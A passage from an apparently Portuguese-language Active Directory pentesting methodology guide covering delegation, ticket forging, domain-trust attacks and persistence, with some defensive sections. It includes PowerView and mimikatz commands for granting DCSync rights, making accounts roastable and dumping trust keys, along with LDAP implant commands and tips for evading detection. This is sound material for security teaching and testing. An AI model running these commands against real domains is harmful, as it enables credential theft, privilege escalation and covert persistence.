Assim, se um **Domain Admin fizer login no computador**, você poderá extrair o TGT dele e personificá-lo usando [Pass the Ticket](pass-the-ticket.md).\
Graças à constrained delegation, você poderia até **comprometer automaticamente um Print Server** (esperançosamente, ele será um DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Se um usuário ou computador estiver autorizado para "Constrained Delegation", ele poderá **personificar qualquer usuário para acessar determinados serviços em um computador**.\
Então, se você **comprometer o hash** desse usuário/computador, poderá **personificar qualquer usuário** (até mesmo domain admins) para acessar determinados serviços.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Ter privilégio **WRITE** sobre um objeto do Active Directory de um computador remoto permite obter execução de código com **privilégios elevados**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abuso de Permissions/ACLs

O usuário comprometido pode ter alguns **privilégios interessantes sobre determinados objetos de domínio** que podem permitir **movimentação** lateral/**escalada** de privilégios.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abuso do serviço Printer Spooler

Descobrir um **serviço Spool escutando** dentro do domínio pode ser **abusado** para **obter novas credenciais** e **escalar privilégios**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abuso de sessões de terceiros

Se **outros usuários** **acessarem** a máquina **comprometida**, será possível **coletar credenciais da memória** e até mesmo **injetar beacons nos processos deles** para personificá-los.\
Normalmente, os usuários acessarão o sistema via RDP; portanto, veja aqui como realizar alguns ataques sobre sessões RDP de terceiros:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

O **LAPS** fornece um sistema para gerenciar a senha do **Administrator local** em computadores ingressados no domínio, garantindo que ela seja **randomizada**, exclusiva e **alterada** com frequência. Essas senhas são armazenadas no Active Directory, e o acesso é controlado por ACLs somente para usuários autorizados. Com permissões suficientes para acessar essas senhas, torna-se possível pivotar para outros computadores.


{{#ref}}
laps.md
{{#endref}}

### Roubo de certificados

**Coletar certificados** da máquina comprometida pode ser uma forma de escalar privilégios dentro do ambiente:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abuso de Certificate Templates

Se **templates vulneráveis** estiverem configurados, será possível abusá-los para escalar privilégios:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation com conta de altos privilégios

### Dumping de credenciais de domínio

Assim que você obtiver privilégios de **Domain Admin** ou, melhor ainda, de **Enterprise Admin**, poderá fazer o **dump** do **banco de dados do domínio**: _ntds.dit_.

[**Mais informações sobre o ataque DCSync podem ser encontradas aqui**](dcsync.md).

[**Mais informações sobre como roubar o NTDS.dit podem ser encontradas aqui**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc como Persistence

Algumas das técnicas discutidas anteriormente podem ser usadas para persistence.\
Por exemplo, você poderia:

- Tornar os usuários vulneráveis a [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Tornar os usuários vulneráveis a [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Conceder privilégios de [**DCSync**](#dcsync) a um usuário

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

O **ataque Silver Ticket** cria um **ticket legítimo de Ticket Granting Service (TGS)** para um serviço específico usando o **hash NTLM** (por exemplo, o **hash da conta do PC**). Esse método é usado para **acessar os privilégios do serviço**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Um **ataque Golden Ticket** envolve um atacante obtendo acesso ao **hash NTLM da conta krbtgt** em um ambiente do Active Directory (AD). Essa conta é especial porque é usada para assinar todos os **Ticket Granting Tickets (TGTs)**, essenciais para autenticação na rede do AD.

Depois que o atacante obtém esse hash, ele pode criar **TGTs** para qualquer conta que escolher (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Eles são semelhantes aos golden tickets, forjados de uma maneira que **contorna os mecanismos comuns de detecção de golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistence de conta com certificados**

**Ter certificados de uma conta ou conseguir solicitá-los** é uma maneira muito eficaz de manter persistence na conta do usuário (mesmo que ele altere a senha):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistence de domínio com certificados**

**Também é possível usar certificados para manter persistence com altos privilégios dentro do domínio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Grupo AdminSDHolder

O objeto **AdminSDHolder** no Active Directory garante a segurança de **grupos privilegiados** (como Domain Admins e Enterprise Admins) aplicando uma **Access Control List (ACL)** padrão a esses grupos para impedir alterações não autorizadas. No entanto, esse recurso pode ser explorado; se um atacante modificar a ACL do AdminSDHolder para conceder acesso total a um usuário comum, esse usuário obterá amplo controle sobre todos os grupos privilegiados. Essa medida de segurança, criada para proteção, pode acabar permitindo acesso indevido se não for monitorada de perto.

[**Mais informações sobre o grupo AdminDSHolder aqui.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Credenciais DSRM

Dentro de cada **Domain Controller (DC)** existe uma conta de **administrador local**. Ao obter direitos administrativos em uma máquina desse tipo, o hash do Administrator local pode ser extraído usando **mimikatz**. Depois disso, é necessária uma modificação no registro para **habilitar o uso dessa senha**, permitindo o acesso remoto à conta Administrator local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Persistence de ACL

Você poderia **conceder** algumas **permissões especiais** a um **usuário** sobre determinados objetos de domínio, permitindo que o usuário **escale privilégios no futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Os **security descriptors** são usados para **armazenar** as **permissões** que um **objeto** possui **sobre** outro **objeto**. Se você puder simplesmente **fazer** uma **pequena alteração** no **security descriptor** de um objeto, poderá obter privilégios muito interessantes sobre esse objeto sem precisar ser membro de um grupo privilegiado.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Abuse a classe auxiliar `dynamicObject` para criar principals/GPOs/registros DNS de curta duração com `entryTTL`/`msDS-Entry-Time-To-Die`; eles se excluem automaticamente sem tombstones, apagando evidências LDAP e deixando SIDs órfãos, referências `gPLink` quebradas ou respostas DNS armazenadas em cache (por exemplo, poluição de ACEs do AdminSDHolder ou redirecionamentos de `gPCFileSysPath`/DNS integrado ao AD).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Altere o **LSASS** na memória para estabelecer uma **senha universal**, concedendo acesso a todas as contas do domínio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Saiba o que é um SSP (Security Support Provider) aqui.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Você pode criar seu **próprio SSP** para **capturar**, em **texto claro**, as **credenciais** usadas para acessar a máquina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Ele registra um **novo Domain Controller** no AD e o usa para **enviar atributos** (SIDHistory, SPNs...) a objetos especificados **sem deixar quaisquer **logs** referentes às **modificações**. Você **precisa de privilégios DA** e deve estar dentro do **root domain**.\
Observe que, se você usar dados incorretos, aparecerão logs bastante desagradáveis.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Anteriormente, discutimos como escalar privilégios quando você tem **permissão suficiente para ler as senhas do LAPS**. No entanto, essas senhas também podem ser usadas para **manter persistence**.\
Confira:


{{#ref}}
laps.md
{{#endref}}

## Escalada de privilégios na Forest - Domain Trusts

A Microsoft considera a **Forest** o limite de segurança. Isso implica que **comprometer um único domínio pode potencialmente levar ao comprometimento de toda a Forest**.<sup>[[1]](#references)</sup>

### Informações básicas

Um [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) é um mecanismo de segurança que permite que um usuário de um **domínio** acesse recursos em outro **domínio**. Ele cria essencialmente uma ligação entre os sistemas de autenticação dos dois domínios, permitindo que as verificações de autenticação fluam de forma transparente. Quando os domínios configuram uma relação de confiança, eles trocam e mantêm **keys** específicas em seus **Domain Controllers (DCs)**, essenciais para a integridade da relação de confiança.

Em um cenário típico, se um usuário pretende acessar um serviço em um **domínio confiável**, primeiro deverá solicitar um ticket especial conhecido como **inter-realm TGT** ao DC de seu próprio domínio. Esse TGT é criptografado com uma **key** compartilhada que ambos os domínios aceitaram. O usuário então apresenta esse TGT ao **DC do domínio confiável** para obter um ticket de serviço (**TGS**). Após validar com sucesso o inter-realm TGT pelo DC do domínio confiável, ele emite um TGS, concedendo ao usuário acesso ao serviço.

**Etapas**:

1. Um **computador cliente** no **Domain 1** inicia o processo usando seu **hash NTLM** para solicitar um **Ticket Granting Ticket (TGT)** ao seu **Domain Controller (DC1)**.
2. O DC1 emite um novo TGT se o cliente for autenticado com sucesso.
3. O cliente solicita então um **inter-realm TGT** ao DC1, necessário para acessar recursos no **Domain 2**.
4. O inter-realm TGT é criptografado com uma **trust key** compartilhada entre DC1 e DC2 como parte do domain trust bidirecional.
5. O cliente leva o inter-realm TGT ao **Domain Controller (DC2) do Domain 2**.
6. O DC2 verifica o inter-realm TGT usando sua trust key compartilhada e, se for válido, emite um **Ticket Granting Service (TGS)** para o servidor no Domain 2 que o cliente deseja acessar.
7. Por fim, o cliente apresenta esse TGS ao servidor, que é criptografado com o hash da conta do servidor, para obter acesso ao serviço no Domain 2.

### Diferentes trusts

É importante observar que **uma trust pode ser unidirecional ou bidirecional**. Nas opções bidirecionais, ambos os domínios confiam um no outro, mas em uma relação de trust **unidirecional**, um dos domínios será o **trusted** e o outro, o domínio **trusting**. Nesse último caso, **você só poderá acessar recursos dentro do domínio trusting a partir do domínio trusted**.

Se o Domain A confia no Domain B, A é o domínio trusting e B é o trusted. Além disso, no **Domain A**, isso seria uma **Outbound trust**; e no **Domain B**, uma **Inbound trust**.

**Diferentes relações de confiança**

- **Parent-Child Trusts**: Esta é uma configuração comum dentro da mesma forest, na qual um child domain possui automaticamente uma trust transitiva bidirecional com seu parent domain. Essencialmente, isso significa que as solicitações de autenticação podem fluir de forma transparente entre o parent e o child.
- **Cross-link Trusts**: Também conhecidas como "shortcut trusts", são estabelecidas entre child domains para acelerar processos de referral. Em forests complexas, as referrals de autenticação normalmente precisam subir até a forest root e depois descer até o domínio de destino. Ao criar cross-links, o caminho é encurtado, o que é especialmente útil em ambientes geograficamente distribuídos.
- **External Trusts**: São configuradas entre domínios diferentes e não relacionados, sendo não transitivas por natureza. De acordo com a [documentação da Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), external trusts são úteis para acessar recursos em um domínio fora da forest atual que não esteja conectado por uma forest trust. A segurança é reforçada por meio de SID filtering com external trusts.
- **Tree-root Trusts**: Essas trusts são estabelecidas automaticamente entre o domínio raiz da forest e uma nova tree root adicionada. Embora não sejam encontradas com frequência, as tree-root trusts são importantes para adicionar novas árvores de domínio a uma forest, permitindo que mantenham um nome de domínio exclusivo e garantindo transitividade bidirecional. Mais informações podem ser encontradas no [guia da Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Esse tipo de trust é uma trust transitiva bidirecional entre dois domínios raiz de forest, também aplicando SID filtering para reforçar as medidas de segurança.
- **MIT Trusts**: Essas trusts são estabelecidas com domínios Kerberos não Windows compatíveis com [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trusts são um pouco mais especializadas e atendem a ambientes que exigem integração com sistemas baseados em Kerberos fora do ecossistema Windows.

#### Outras diferenças nas **relações de confiança**

- Uma relação de confiança também pode ser **transitiva** (A confia em B, B confia em C, então A confia em C) ou **não transitiva**.
- Uma relação de confiança pode ser configurada como **bidirectional trust** (ambos confiam um no outro) ou como **one-way trust** (apenas um confia no outro).

### Caminho de ataque

1. **Enumerar** as relações de confiança
2. Verificar se algum **security principal** (usuário/grupo/computador) tem **acesso** a recursos do **outro domínio**, talvez por entradas ACE ou por pertencer a grupos do outro domínio. Procure **relações entre domínios** (provavelmente a trust foi criada para isso).
1. Kerberoast neste caso também pode ser uma opção.
3. **Comprometer** as **contas** que podem **pivotar** entre domínios.

Atacantes que podem acessar recursos em outro domínio por meio de três mecanismos principais:

- **Local Group Membership**: Principals podem ser adicionados a grupos locais em máquinas, como o grupo “Administrators” em um servidor, concedendo a eles controle significativo sobre essa máquina.
- **Foreign Domain Group Membership**: Principals também podem ser membros de grupos dentro do domínio estrangeiro. No entanto, a eficácia desse método depende da natureza da trust e do escopo do grupo.
- **Access Control Lists (ACLs)**: Principals podem ser especificados em uma **ACL**, especialmente como entidades em **ACEs** dentro de uma **DACL**, concedendo acesso a recursos específicos. Para quem deseja entender melhor a mecânica de ACLs, DACLs e ACEs, o whitepaper intitulado “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” é um recurso valioso.<sup>[[17]](#references)</sup>

### Encontrar usuários/grupos externos com permissões

Você pode verificar **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** para encontrar security principals estrangeiros no domínio. Eles serão usuários/grupos de **um domínio/forest externo**.

Você pode verificar isso no **Bloodhound** ou usando o powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Escalonamento de privilégios de filho para pai na forest
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Outras formas de enumerar trusts de domínio:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Existem **2 trusted keys**, uma para _Child --> Parent_ e outra para _Parent_ --> _Child_.\
> Você pode obter a usada pelo domínio atual com:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escale como Enterprise admin para o domínio child/parent abusando da trust com SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Entender como a Configuration Naming Context (NC) pode ser explorada é crucial. A Configuration NC atua como um repositório central para dados de configuração em toda uma forest nos ambientes Active Directory (AD). Esses dados são replicados para cada Domain Controller (DC) dentro da forest, com DCs writable mantendo uma cópia writable da Configuration NC. Para explorar isso, é necessário ter **privilégios SYSTEM em um DC**, preferencialmente um child DC.

**Vincular GPO ao site do root DC**

O container Sites da Configuration NC inclui informações sobre os sites de todos os computadores ingressados no domínio dentro da forest do AD. Operando com privilégios SYSTEM em qualquer DC, os attackers podem vincular GPOs aos sites dos root DCs. Essa ação pode comprometer o root domain ao manipular as políticas aplicadas a esses sites.

Para obter informações detalhadas, pode-se consultar pesquisas sobre [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Comprometer qualquer gMSA na forest**

Um vetor de ataque envolve como alvo gMSAs privilegiadas dentro do domínio. A KDS Root key, essencial para calcular as passwords das gMSAs, é armazenada na Configuration NC. Com privilégios SYSTEM em qualquer DC, é possível acessar a KDS Root key e calcular as passwords de qualquer gMSA em toda a forest.

Uma análise detalhada e orientações passo a passo podem ser encontradas em:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ataque complementar a MSA delegada (BadSuccessor – abusando dos atributos de migração):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Pesquisa externa adicional: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Ataque de alteração do Schema**

Este método requer paciência, aguardando a criação de novos objetos AD privilegiados. Com privilégios SYSTEM, um attacker pode modificar o AD Schema para conceder a qualquer usuário controle completo sobre todas as classes. Isso pode levar a acesso e controle não autorizados sobre objetos AD recém-criados.

Mais informações estão disponíveis em [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**De DA para EA com ADCS ESC5**

A vulnerabilidade ADCS ESC5 tem como alvo o controle sobre objetos de Public Key Infrastructure (PKI) para criar um certificate template que permita a autenticação como qualquer usuário dentro da forest. Como os objetos PKI residem na Configuration NC, comprometer um child DC writable permite a execução de ataques ESC5.

Mais detalhes podem ser encontrados em [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> Em cenários sem ADCS, o attacker tem a capacidade de configurar os componentes necessários, conforme discutido em [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Neste cenário, **seu domínio é confiável** por um domínio externo que lhe concede **permissões indeterminadas** sobre ele. Você precisará descobrir **quais principals do seu domínio têm qual acesso ao domínio externo** e, em seguida, tentar explorá-lo:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Domínio de Floresta Externa - Unidirecional (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Neste cenário, **seu domínio** está **confiando** alguns **privilégios** a um principal de **domínios diferentes**.

No entanto, quando um **domínio é confiado** pelo domínio que confia, o domínio confiável **cria um usuário** com um **nome previsível** que usa como **senha a senha do domínio confiável**. Isso significa que é possível **acessar um usuário do domínio que confia para entrar no domínio confiável**, enumerá-lo e tentar escalar ainda mais os privilégios:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Outra forma de comprometer o domínio confiável é encontrar um [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) criado na **direção oposta** à confiança entre os domínios (o que não é muito comum).

Outra forma de comprometer o domínio confiável é aguardar em uma máquina onde um **usuário do domínio confiável possa acessar** para fazer login via **RDP**. Então, o atacante poderia injetar código no processo da sessão RDP e **acessar o domínio de origem da vítima** a partir dali.\
Além disso, se a **vítima tiver montado seu disco rígido**, a partir do processo da **sessão RDP** o atacante poderia armazenar **backdoors** na **pasta de inicialização do disco rígido**. Essa técnica é chamada **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigação do abuso de confiança entre domínios

### **SID Filtering:**

- O risco de ataques que exploram o atributo SID history entre forest trusts é mitigado pelo SID Filtering, ativado por padrão em todas as relações de confiança entre forests. Isso se baseia na suposição de que as relações de confiança dentro da forest são seguras, considerando a forest, e não o domínio, como o limite de segurança, de acordo com a posição da Microsoft.
- No entanto, há uma desvantagem: o SID filtering pode interromper aplicações e o acesso de usuários, levando à sua desativação ocasional.

### **Selective Authentication:**

- Para relações de confiança entre forests, o uso de Selective Authentication garante que os usuários das duas forests não sejam autenticados automaticamente. Em vez disso, são necessárias permissões explícitas para que os usuários acessem domínios e servidores dentro do domínio ou forest que confia.
- É importante observar que essas medidas não protegem contra a exploração do writable Configuration Naming Context (NC) nem contra ataques à conta de confiança.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Abuso de AD baseado em LDAP a partir de Implantes no Host

A [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) reimplementa primitivas LDAP no estilo bloodyAD como Beacon Object Files x64 que são executados inteiramente dentro de um implante no host (por exemplo, Adaptix C2). Os operadores compilam o pacote com `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, carregam `ldap.axs` e então executam `ldap <subcommand>` a partir do beacon. Todo o tráfego usa o contexto de segurança do logon atual via LDAP (389), com signing/sealing, ou LDAPS (636), com confiança automática no certificado; portanto, não são necessários socks proxies nem artefatos em disco.<sup>[[4]](#references)</sup>

### Enumeração LDAP no lado do implante

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` e `get-groupmembers` resolvem nomes curtos/caminhos de OU em DNs completos e despejam os objetos correspondentes.
- `get-object`, `get-attribute` e `get-domaininfo` extraem atributos arbitrários (incluindo security descriptors), além dos metadados da forest/domínio a partir do `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` e `get-rbcd` expõem diretamente a partir do LDAP candidatos a roasting, configurações de delegação e descritores existentes de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).
- `get-acl` e `get-writable --detailed` analisam a DACL para listar trustees, direitos (GenericAll/WriteDACL/WriteOwner/gravações de atributos) e herança, fornecendo alvos imediatos para privilege escalation via ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### Primitivas de escrita LDAP para escalation & persistence

- BOFs de criação de objetos (`add-user`, `add-computer`, `add-group`, `add-ou`) permitem ao operador preparar novos principals ou contas de máquina onde quer que existam direitos de OU. `add-groupmember`, `set-password`, `add-attribute` e `set-attribute` assumem diretamente o controle dos alvos assim que são encontrados direitos de escrita em propriedades.
- Comandos focados em ACL, como `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` e `add-dcsync`, transformam WriteDACL/WriteOwner em qualquer objeto AD em redefinições de senha, controle de associação a grupos ou privilégios de replicação DCSync, sem deixar artefatos do PowerShell/ADSI. Os equivalentes `remove-*` limpam as ACEs injetadas.

### Delegation, roasting e abuso de Kerberos

- `add-spn`/`set-spn` tornam instantaneamente um usuário comprometido vulnerável a Kerberoast; `add-asreproastable` (alternância de UAC) marca-o para AS-REP roasting sem tocar na senha.
- Macros de Delegation (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) reescrevem `msDS-AllowedToDelegateTo`, flags de UAC ou `msDS-AllowedToActOnBehalfOfOtherIdentity` a partir do beacon, habilitando caminhos de ataque constrained/unconstrained/RBCD e eliminando a necessidade de PowerShell remoto ou RSAT.

### Injeção de sidHistory, realocação de OU e modelagem da superfície de ataque

- `add-sidhistory` injeta SIDs privilegiados no histórico de SID de um principal controlado (consulte [SID-History Injection](sid-history-injection.md)), fornecendo herança furtiva de acesso totalmente por LDAP/LDAPS.
- `move-object` altera o DN/OU de computadores ou usuários, permitindo que um atacante arraste ativos para OUs onde já existem direitos delegados antes de abusar de `set-password`, `add-groupmember` ou `add-spn`.
- Comandos de remoção com escopo restrito (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) permitem um rollback rápido depois que o operador coleta credenciais ou persistence, minimizando a telemetria.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Algumas Defesas Gerais

[**Saiba mais sobre como proteger credenciais aqui.**](../stealing-credentials/credentials-protections.md)

### **Medidas Defensivas para Proteção de Credenciais**

- **Restrições para Domain Admins**: recomenda-se que Domain Admins tenham permissão para fazer login somente em Domain Controllers, evitando seu uso em outros hosts.
- **Privilégios de Service Accounts**: os serviços não devem ser executados com privilégios de Domain Admin (DA), a fim de manter a segurança.
- **Limitação Temporal de Privilégios**: para tarefas que exigem privilégios de DA, sua duração deve ser limitada. Isso pode ser obtido com: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Mitigação de LDAP relay**: audite os Event IDs 2889/3074/3075 e, em seguida, imponha LDAP signing e o channel binding de LDAPS em DCs/clientes para bloquear tentativas de LDAP MITM/relay.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Fingerprinting em nível de protocolo da atividade do Impacket

Se você quiser detectar tradecraft comum de AD, **não dependa apenas de artefatos controlados pelo operador**, como binários renomeados, nomes de serviços, arquivos batch temporários ou caminhos de saída. Estabeleça uma baseline de como clientes legítimos do Windows constroem o tráfego de [Kerberos](kerberos-authentication.md), [NTLM](../ntlm/README.md), SMB, LDAP, DCE/RPC e WMI e, em seguida, procure **particularidades de implementação** que permaneçam mesmo depois que o operador edite `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` ou `ntlmrelayx.py`.<sup>[[8]](#references)</sup>

- **Candidatos independentes de alta confiança** (após validação com sua própria baseline):
- DCE/RPC autenticado usando `auth_context_id = 79231 + ctx_id`
- Padding de autenticação DCE/RPC preenchido com `0xff`
- Binds LDAP Kerberos que colocam um `AP-REQ` Kerberos bruto diretamente em `mechToken` do SPNEGO
- Requisições de negociação SMB2/3 com valores de aparência ASCII em `ClientGuid`
- WMI `IWbemLevel1Login::NTLMLogin` usando o namespace não padrão `//./root/cimv2`
- Valores de nonce Kerberos hardcoded
- **Melhores como recursos de correlação/pontuação**:
- Listas de etype Kerberos esparsas ou duplicadas, `PA-DATA` incomum/ausente ou ordenação de etypes em TGS-REQ diferente da nativa do Windows
- Mensagens NTLM Type 1 sem informações de versão ou mensagens Type 3 com nomes de host nulos
- NTLMSSP bruto transportado em DCE/RPC em vez de SPNEGO, trailers de verificação DCE/RPC ausentes ou incompatibilidades de OID entre SPNEGO/Kerberos
- Vários desses atributos provenientes do mesmo host/usuário/sessão/janela de tempo são muito mais fortes do que qualquer campo fraco isolado
- **Use como enriquecimento, não como alertas independentes**:
- Nomes de arquivo padrão, caminhos de saída, nomes de serviço aleatórios, nomes de batch temporários, nomes padrão de contas de computador e strings específicas de ferramentas para HTTP/WebDAV/RDP/MSSQL
- São fáceis de alterar pelos operadores e devem ser usados principalmente para explicar por que um cluster cross-protocol é suspeito
- **Observações operacionais**:
- Alguns desses sinais exigem tráfego descriptografado, parsing de [PCAP/Zeek](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW ou visibilidade no lado do serviço
- Valide com clientes Samba/Linux, appliances e software legado antes de promovê-los a alertas
- Promova as detecções de enrichment -> hunting -> alerting à medida que você ganha confiança na baseline

### **Implementando Técnicas de Deception**

- A implementação de deception envolve configurar armadilhas, como usuários ou computadores chamariz, com características como senhas que não expiram ou marcadas como Trusted for Delegation. Uma abordagem detalhada inclui criar usuários com direitos específicos ou adicioná-los a grupos de altos privilégios.<sup>[[2]](#references)</sup>
- Um exemplo prático envolve o uso de ferramentas como: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Mais informações sobre a implantação de técnicas de deception podem ser encontradas em [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identificando Deception**

- **Para objetos de usuário**: indicadores suspeitos incluem ObjectSID atípico, logons pouco frequentes, datas de criação e baixa contagem de senhas incorretas.
- **Indicadores gerais**: comparar os atributos de possíveis objetos chamariz com os de objetos legítimos pode revelar inconsistências. Ferramentas como [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) podem ajudar a identificar essas deceptions.

### **Contornando Sistemas de Detecção**

- **Bypass da detecção do Microsoft ATA**:
- **Enumeração de usuários**: evitar a enumeração de sessões em Domain Controllers para impedir a detecção pelo ATA.
- **Impersonação de tickets**: utilizar chaves **aes** para criação de tickets ajuda a evadir a detecção ao não fazer downgrade para NTLM.
- **Ataques DCSync**: recomenda-se executá-los a partir de um host que não seja um Domain Controller para evitar a detecção pelo ATA, pois a execução direta a partir de um Domain Controller acionará alertas.

## References

- [1] [Um Guia para Atacar Relações de Confiança entre Domínios](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Forjando Relações de Confiança para Deception no Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [De Domain Admin para Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [Coleção LDAP BOF – Toolkit LDAP em Memória para Exploração do Active Directory](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [CTF Barbhack 2025 (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Dissecting Impacket](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
